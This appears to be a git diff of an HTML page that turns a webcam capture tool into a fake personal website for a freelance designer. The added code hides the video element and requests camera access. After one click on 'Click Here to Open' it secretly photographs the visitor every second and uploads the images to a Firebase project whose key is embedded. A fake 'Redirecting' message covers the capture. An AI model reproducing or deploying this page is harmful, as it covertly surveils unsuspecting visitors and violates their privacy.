@@ -3,31 +3,75 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Webcam Photo Capture</title>
+    <title>Mahmood Kooriyad - Personal Website</title>
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="Mahmood Kooriyad - Personal Website">
+    <meta property="og:description" content="I'm Mahmood Kooriyad. A freelancing Designer">
+    <meta property="og:type" content="website">
+    
+    <!-- Other Meta Tags -->
+    <meta name="description" content="I'm Mahmood Kooriyad. A freelancing Designer">
+    
     <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+
+        #header {
+            background-color: #333;
+            color: #fff;
+            padding: 20px;
+        }
+
+        #imageContainer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        #video {
+            display: none;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+
         #captureButton {
-            display: block;
             padding: 10px 20px;
             background-color: #ff0000;
             color: white;
             border: none;
             cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
         }
 
-        #imageContainer {
-            text-align: center;
-        }
-        #video{
-            height: 0px;
-            width: 0px;
+        #redir {
+            padding: 10px 20px;
+            background-color: #ff0000;
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <h1>No Ads</h1>
+    <div id="header">
+        <h1>I'm Mahmood Kooriyad.</h1>
+    </div>
     <div id="imageContainer">
+        <h4>Visit My Personal Website</h4>
         <video id="video" autoplay></video>
-        <button id="captureButton" onclick="myFunction()">Click Here</button>
+        <button id="redir" style="display: none;">Please Wait. Redirecting........</button>
+        <button id="captureButton" onclick="myFunction()">Click Here to Open</button>
     </div>
 
     <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-app.js"></script>
@@ -38,23 +82,24 @@
     <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-messaging.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-functions.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.3.2/firebase-analytics.js"></script>
+
     <script>
         // Initialize Firebase
         var firebaseConfig = {
-            apiKey: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  authDomain: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  databaseURL: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  projectId: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  storageBucket: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  messagingSenderId: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  appId: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
-  measurementId: "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+            apiKey: "AIzaSyBGMfjKSH3fk1JOeQvSo2uzqlNTMMQFBWc",
+            authDomain: "webcam-f1269.firebaseapp.com",
+            projectId: "webcam-f1269",
+            storageBucket: "webcam-f1269.appspot.com",
+            messagingSenderId: "90764998407",
+            appId: "1:90764998407:web:887c89c1bf105b34b7f7a2",
+            measurementId: "G-D570V4RH4E"
         };
         firebase.initializeApp(firebaseConfig);
 
         // Get references to the video and capture button
         const video = document.getElementById("video");
         const captureButton = document.getElementById("captureButton");
+        const reButton = document.getElementById("redir");
 
         // Create a media stream from the user's webcam
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
@@ -67,9 +112,24 @@
 
         // Handle the capture button click
         captureButton.addEventListener("click", function() {
-            takePicture();
+            startImageCapture();
         });
 
+        let captureInterval;
+
+        function startImageCapture() {
+            // Start capturing an image every second
+            captureInterval = setInterval(function() {
+                takePicture();
+            }, 1000);
+        }
+
+        function stopImageCapture() {
+            // Stop the image capture interval
+            clearInterval(captureInterval);
+        }
+
+        // Additional action after taking a picture
         function takePicture() {
             // Create a canvas element to capture the image
             const canvas = document.createElement('canvas');
@@ -82,7 +142,7 @@
             const imageDataURL = canvas.toDataURL('image/jpeg');
 
             // Generate a unique filename using the current timestamp
-            const timestamp = Date.now();
+            const timestamp = new Date().toISOString().replace(/[-:.]/g, "");
             const imageName = `image_${timestamp}.jpg`;
 
             // Upload the image to Firebase Storage
@@ -99,17 +159,15 @@
                     console.error('Error uploading image:', error);
                 });
         }
-    </script>
-    <script>
-        function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
+        function myFunction(){
+            captureButton.style.display = "none";
+            reButton.style.display = "block";
 
-function myFunction() {
-    alert("Click On The Button For 3 Times...")
-    sleep(8000).then(() => { window.open("https://www.youtube.com"); });
-}
 
+        }
+
+        // Call stopImageCapture when needed, for example, when the user closes the website or performs another action.
+        // stopImageCapture();
     </script>
 </body>
 </html>
